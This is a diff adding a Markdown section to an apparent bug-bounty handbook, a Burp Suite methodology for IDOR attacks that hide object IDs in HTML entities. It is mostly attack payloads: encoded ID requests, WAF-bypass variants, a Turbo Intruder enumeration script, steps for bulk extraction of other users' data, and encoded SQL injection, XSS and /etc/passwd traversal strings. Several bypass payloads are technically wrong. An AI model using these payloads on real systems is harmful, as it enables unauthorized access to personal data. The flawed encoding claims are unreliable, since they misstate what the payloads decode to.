@@ -7909,3 +7909,593 @@ bcheck run --file idor_base64.bcheck --target https://example.com
 
 ---
 
+# 🔍 **Bug #15: HTML Encoding IDOR - Complete Burp Suite Methodology**
+
+## 📌 **Bug Description**
+**HTML Encoding IDOR** - Manipulating IDs using HTML entities (e.g., `&#49;&#48;&#48;` for "100") to bypass input filters and access unauthorized resources.
+
+---
+
+## 🎯 **Target Scenarios**
+- Applications using WAF/input filters
+- APIs that decode HTML entities
+- Forms with client-side validation only
+- Legacy applications with improper decoding
+- XML-based APIs accepting HTML entities
+
+---
+
+## 📊 **Detection Methodology**
+
+### **Phase 1: Reconnaissance**
+
+#### **1.1 Map the Application**
+```
+Target: https://target.com
+Tools: Burp Suite (Spider + Target tab)
+
+Steps:
+1. Configure Burp browser
+2. Turn on Intercept (Proxy → Intercept → Intercept is on)
+3. Browse application normally
+4. Note all endpoints with ID parameters
+```
+
+#### **1.2 Identify Potential Parameters**
+```bash
+Common parameter names to look for:
+- id, user_id, account_id, profile_id
+- file_id, document_id, message_id
+- order_id, transaction_id, payment_id
+- uid, pid, ref, reference
+- item, product, category
+```
+
+#### **1.3 Create Parameter List**
+```
+Burp → Target → Site map
+Right-click → Add to Scope
+Filter by parameter names
+Export to Intruder later
+```
+
+---
+
+## 🔧 **Phase 2: Setup Burp Suite**
+
+### **2.1 Configure Burp for HTML Encoding**
+
+#### **Burp Professional Setup:**
+```yaml
+Proxy Settings:
+- Enable Intercept
+- Set Intercept Client Requests: "All"
+- Enable "Match and Replace" rules
+```
+
+#### **Custom Match/Replace Rules:**
+```
+Add Rule:
+  Match: ^(\d+)$
+  Replace: HTML Entity of matched numbers
+  Type: Request header/body
+```
+
+### **2.2 Install Extensions (Optional but Helpful)**
+```
+Extender → BApp Store → Install:
+1. "Encoder" - Quick encoding/decoding
+2. "Turbo Intruder" - Faster attacks
+3. "Param Miner" - Discover hidden parameters
+4. "HTTP Request Smuggler" - Advanced bypass
+```
+
+---
+
+## 🎨 **Phase 3: HTML Entity Encoding Techniques**
+
+### **3.1 HTML Entity Reference Table**
+```html
+<!-- Numeric Character References -->
+Decimal: 100 = &#49;&#48;&#48;
+Hex: 100 = &#x31;&#x30;&#x30;
+
+<!-- Named Entities (limited use) -->
+&lt; = <
+&gt; = >
+&amp; = &
+&quot; = "
+&apos; = '
+```
+
+### **3.2 Encoding Tools in Burp**
+
+#### **Decoder Tool Usage:**
+```
+Burp → Decoder
+
+Input: 100
+Encode as: HTML Decimal
+Result: &#49;&#48;&#48;
+
+Input: 100
+Encode as: HTML Hex
+Result: &#x31;&#x30;&#x30;
+```
+
+#### **Encoder Tab in Intruder:**
+```
+Intruder → Payloads → Payload Encoding
+Check: "URL-encode these characters"
+Add custom HTML encoding rules
+```
+
+---
+
+## ⚔️ **Phase 4: Attack Methodology**
+
+### **4.1 Step 1: Baseline Request**
+```http
+GET /api/user/profile?id=100 HTTP/1.1
+Host: target.com
+Cookie: session=abc123
+
+Response: 200 OK (Your profile)
+```
+
+### **4.2 Step 2: Test Basic IDOR**
+```http
+GET /api/user/profile?id=101 HTTP/1.1
+Host: target.com
+Cookie: session=abc123
+
+Response: 403 Forbidden (Protected)
+```
+
+### **4.3 Step 3: HTML Entity Test**
+
+#### **Using Repeater:**
+```
+Send request to Repeater (Ctrl+R)
+
+Test 1 - Decimal Entity:
+GET /api/user/profile?id=&#49;&#48;&#49; HTTP/1.1
+
+Test 2 - Hex Entity:
+GET /api/user/profile?id=&#x31;&#x30;&#x31; HTTP/1.1
+
+Test 3 - Mixed Encoding:
+GET /api/user/profile?id=&#49;0&#49; HTTP/1.1
+
+Test 4 - Partial Entity:
+GET /api/user/profile?id=1&#48;1 HTTP/1.1
+```
+
+### **4.4 Step 4: Automated Testing with Intruder**
+
+#### **Intruder Setup:**
+
+```yaml
+Position: id=§100§
+
+Payloads Tab:
+1. Payload Type: "Custom Iterator"
+2. Create 3 position iterator:
+   - Position 1: [&#49;, &#x31;, 1] (digit 1 representations)
+   - Position 2: [&#48;, &#x30;, 0] (digit 0 representations)  
+   - Position 3: [&#49;, &#x31;, 1] (digit 1 representations)
+3. Process: Combine in order
+
+OR simpler:
+Payload Type: "Numbers"
+From: 1
+To: 1000
+Step: 1
+Enable: "Encode payloads"
+Custom Encoding: HTML Decimal/Hex
+```
+
+#### **Payload Generation Script:**
+```python
+# Use Burp's "Payload Generator" with this logic
+def generate_payloads():
+    digits = {
+        '0': ['0', '&#48;', '&#x30;'],
+        '1': ['1', '&#49;', '&#x31;'],
+        '2': ['2', '&#50;', '&#x32;'],
+        # ... for all digits
+    }
+    
+    for i in range(100, 200):
+        payload = ''
+        for digit in str(i):
+            payload += random.choice(digits[digit])
+        yield payload
+```
+
+### **4.5 Step 5: Advanced Encoding Bypasses**
+
+#### **Double Encoding:**
+```http
+First encode: 101 → &#49;&#48;&#49;
+Second encode: &#49;&#48;&#49; → %26%2349%3B%26%2348%3B%26%2349%3B
+Request: GET /api/user/profile?id=%26%2349%3B%26%2348%3B%26%2349%3B
+```
+
+#### **Mixed Case/Format:**
+```http
+GET /api/user/profile?id=&#49;&#48;&#49;   (decimal)
+GET /api/user/profile?id=&#X31;&#X30;&#X31; (uppercase hex)
+GET /api/user/profile?id=&#x0031;&#x0030;&#x0031; (padded hex)
+GET /api/user/profile?id=&#00049;&#00048;&#00049; (padded decimal)
+```
+
+#### **Combined with other techniques:**
+```http
+# HTML Entity + Path Traversal
+GET /api/user/profile?id=&#46;&#46;&#47;&#49;&#48;&#49; (../101)
+
+# HTML Entity + Null Byte
+GET /api/user/profile?id=&#49;&#48;&#49;%00
+
+# HTML Entity + New Line
+GET /api/user/profile?id=&#49;&#48;&#49;%0a
+```
+
+---
+
+## 🔍 **Phase 5: Detection & Validation**
+
+### **5.1 Response Analysis Matrix**
+
+| Status Code | Content Length | Response Body | Verdict |
+|------------|----------------|---------------|---------|
+| 200 | 2450 | "John's Profile" | Vulnerable |
+| 200 | 2450 | "Jane's Profile" | Vulnerable |
+| 403 | 150 | "Access Denied" | Protected |
+| 404 | 120 | "Not Found" | Invalid ID |
+| 500 | 200 | Error | WAF Blocked |
+
+### **5.2 Burp Filters for Detection**
+```
+Proxy → HTTP History → Filter Bar
+
+Set filter to show:
+- Status: 200, 302
+- MIME type: HTML, JSON, XML
+- Search: (profile|user|account|data)
+```
+
+### **5.3 Compare Responses**
+
+#### **Using Comparer:**
+```
+1. Send original request (id=100) to Comparer
+2. Send test request (id=&#49;&#48;&#49;) to Comparer
+3. Compare responses for similarities
+4. Look for personal data differences
+```
+
+#### **Using Intruder Grep:**
+```
+Intruder → Options → Grep - Extract
+Add items to extract:
+- Username: <span class="username">(.*?)</span>
+- Email: <div class="email">(.*?)</div>
+- Account number: "account":"(\d+)"
+```
+
+---
+
+## 🛡️ **Phase 6: WAF Bypass Techniques**
+
+### **6.1 Identify WAF**
+```http
+# Send malformed entity
+GET /api/user/profile?id=&#9999999; HTTP/1.1
+
+If response changes (blocked/200) → WAF present
+```
+
+### **6.2 WAF Bypass Payloads**
+
+```http
+# 1. Broken Entity
+GET /api/user/profile?id=&#49;&#48 HTTP/1.1
+
+# 2. Missing Semicolon
+GET /api/user/profile?id=&#49101 HTTP/1.1
+
+# 3. Overlong UTF-8
+GET /api/user/profile?id=%C0%AE%C0%AE%C0%AF101
+
+# 4. Unicode Fullwidth
+GET /api/user/profile?id=％３１％３０％３１
+
+# 5. Tab between & and #
+GET /api/user/profile?id=&#9;49;&#9;48;&#9;49;
+
+# 6. Line breaks in entity
+GET /api/user/profile?id=&#49;%0a&#48;%0a&#49;
+
+# 7. Null bytes between digits
+GET /api/user/profile?id=&#49;%00&#48;%00&#49;
+```
+
+### **6.3 Progressive Bypass Strategy**
+```
+Level 1: Basic entities → Blocked
+Level 2: Mixed entities → Blocked  
+Level 3: Double encoded → Allowed
+Level 4: Split entities → Allowed
+Level 5: Unicode variants → Allowed
+```
+
+---
+
+## 📊 **Phase 7: Automation with Turbo Intruder**
+
+### **7.1 Python Script for Turbo Intruder**
+```python
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=5,
+                           requestsPerConnection=100,
+                           pipeline=False)
+
+    # Generate HTML entity payloads
+    for id in range(100, 200):
+        # Decimal entity
+        dec_entity = ''.join(f'&#{ord(d)};' for d in str(id))
+        engine.queue(target.req, dec_entity)
+        
+        # Hex entity  
+        hex_entity = ''.join(f'&#x{ord(d):x};' for d in str(id))
+        engine.queue(target.req, hex_entity)
+        
+        # Mixed encoding
+        mixed = ''
+        for i, d in enumerate(str(id)):
+            if i % 2 == 0:
+                mixed += f'&#{ord(d)};'
+            else:
+                mixed += f'&#x{ord(d):x};'
+        engine.queue(target.req, mixed)
+
+def handleResponse(req, interesting):
+    if '200' in req.response:
+        print(f"Vulnerable: {req.path}?id={req.payload}")
+        table.add(req)
+```
+
+### **7.2 Run Turbo Intruder**
+```
+1. Right-click request → Extensions → Turbo Intruder
+2. Send to Turbo Intruder
+3. Paste Python script
+4. Click "Attack"
+```
+
+---
+
+## 🔬 **Phase 8: Manual Testing Deep Dive**
+
+### **8.1 Test Different Locations**
+
+```http
+# URL Path
+GET /api/user/&#49;&#48;&#49; HTTP/1.1
+
+# Query Parameter
+GET /api/data?user_id=&#49;&#48;&#49; HTTP/1.1
+
+# POST JSON
+POST /api/update HTTP/1.1
+Content-Type: application/json
+
+{"id":"&#49;&#48;&#49;","name":"test"}
+
+# POST Form
+POST /api/update HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+id=&#49;&#48;&#49;&name=test
+
+# Cookie
+Cookie: user_id=&#49;&#48;&#49;; session=abc123
+
+# Header
+X-User-ID: &#49;&#48;&#49;
+```
+
+### **8.2 Test Different ID Types**
+
+```http
+# Numeric ID
+?id=&#49;&#48;&#49;
+
+# String ID  
+?username=&#97;&#100;&#109;&#105;&#110; (admin)
+
+# Email
+?email=&#117;&#115;&#101;&#114;&#64;&#101;&#120;&#97;&#109;&#112;&#108;&#101;&#46;&#99;&#111;&#109;
+
+# UUID (partial)
+?id=&#49;&#50;&#51;&#101;&#52;&#53;&#54;&#55; (123e4567)
+```
+
+### **8.3 Context-Specific Testing**
+
+```http
+# File Download
+GET /download?file=&#114;&#101;&#112;&#111;&#114;&#116;&#46;&#112;&#100;&#102; (report.pdf)
+
+# Image Access  
+GET /images/&#112;&#114;&#111;&#102;&#105;&#108;&#101;&#49;&#48;&#49;&#46;&#106;&#112;&#103;
+
+# API Endpoint
+GET /api/v1/users/&#49;&#48;&#49;/posts
+```
+
+---
+
+## 📈 **Phase 9: Advanced Exploitation**
+
+### **9.1 Chaining with Other Vulnerabilities**
+
+```http
+# 1. HTML Entity + SQL Injection
+GET /api/search?q=&#39;&#32;&#79;&#82;&#32;&#49;&#61;&#49;&#59;&#45;&#45; (SQLi payload)
+
+# 2. HTML Entity + XSS
+GET /api/profile?id=&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+
+# 3. HTML Entity + Path Traversal
+GET /api/files?path=&#46;&#46;&#47;&#46;&#46;&#47;&#101;&#116;&#99;&#47;&#112;&#97;&#115;&#115;&#119;&#100;
+```
+
+### **9.2 Data Exfiltration**
+
+```http
+# Sequential extraction
+1. Get user 100: /api/user/&#49;&#48;&#48;
+2. Get user 101: /api/user/&#49;&#48;&#49;
+3. Get user 102: /api/user/&#49;&#48;&#50;
+
+# Batch extraction  
+POST /api/users/batch
+["&#49;&#48;&#48;", "&#49;&#48;&#49;", "&#49;&#48;&#50;"]
+
+# Range extraction
+GET /api/users?start=&#49;&#48;&#48;&end=&#50;&#48;&#48;
+```
+
+---
+
+## 📝 **Phase 10: Reporting**
+
+### **10.1 Documentation Template**
+
+```markdown
+# Vulnerability: HTML Encoded IDOR
+
+## Description
+The application fails to properly validate HTML-encoded object references,
+allowing unauthorized access to other users' data.
+
+## Endpoint
+`GET /api/user/profile`
+
+## Parameters
+- `id` (accepts HTML entities)
+
+## Proof of Concept
+Original (authorized):
+GET /api/user/profile?id=100
+
+Exploit (HTML encoded):
+GET /api/user/profile?id=&#49;&#48;&#49;
+
+## Impact
+- Access to other users' personal information
+- PII disclosure
+- Account takeover potential
+
+## Remediation
+1. Validate permissions server-side after decoding
+2. Use indirect reference maps
+3. Implement proper access controls
+4. Disable HTML entity parsing in URLs
+```
+
+### **10.2 Evidence Collection**
+```
+Burp → Project Options → Save copies of:
+1. Original request/response
+2. Successful exploit request/response
+3. Intruder attack results
+4. Screenshots of accessed data
+5. Timeline of testing
+```
+
+---
+
+## 🛠️ **Phase 11: Custom Burp Extensions**
+
+### **11.1 Create Simple Extension**
+```python
+from burp import IBurpExtender, IHttpListener
+from java.net import URL
+
+class BurpExtender(IBurpExtender, IHttpListener):
+    def registerExtenderCallbacks(self, callbacks):
+        self._callbacks = callbacks
+        self._helpers = callbacks.getHelpers()
+        callbacks.setExtensionName("HTML Entity IDOR Finder")
+        callbacks.registerHttpListener(self)
+        
+    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
+        if not messageIsRequest:
+            return
+            
+        request = messageInfo.getRequest()
+        analyzed = self._helpers.analyzeRequest(request)
+        params = analyzed.getParameters()
+        
+        for param in params:
+            if "id" in param.getName().lower():
+                # Test HTML entity variants
+                self.test_html_entity(messageInfo, param)
+    
+    def test_html_entity(self, messageInfo, param):
+        # Implementation for testing
+        pass
+```
+
+---
+
+## ✅ **Phase 12: Validation Checklist**
+
+- [ ] Found endpoint with ID parameter
+- [ ] Confirmed parameter accepts HTML entities
+- [ ] Successfully accessed another user's data
+- [ ] Verified with multiple IDs
+- [ ] Tested different HTTP methods
+- [ ] Checked for WAF bypass
+- [ ] Documented exact payload
+- [ ] Captured evidence
+- [ ] Assessed business impact
+- [ ] Verified remediation suggestion
+
+---
+
+## 🎯 **Success Indicators**
+
+```
+✅ 200 OK with other user's data
+✅ 302 Redirect to other user's session
+✅ Partial data disclosure
+✅ Different response length/behavior
+✅ Error messages revealing data
+```
+
+---
+
+## ⚠️ **Common Pitfalls**
+
+1. **Not checking URL decoding order**
+2. **Missing double-encoded payloads**  
+3. **Ignoring response differences**
+4. **Not testing all parameter locations**
+5. **Stopping at first success**
+
+---
+
+## 🔗 **Resources**
+
+- Burp Suite Documentation: portswigger.net/burp/documentation
+- HTML Entity Reference: dev.w3.org/html5/html-author/charref
+- OWASP IDOR Guide: owasp.org/IDOR
+- PortSwigger IDOR Labs: portswigger.net/web-security/access-control/idor
+
+---
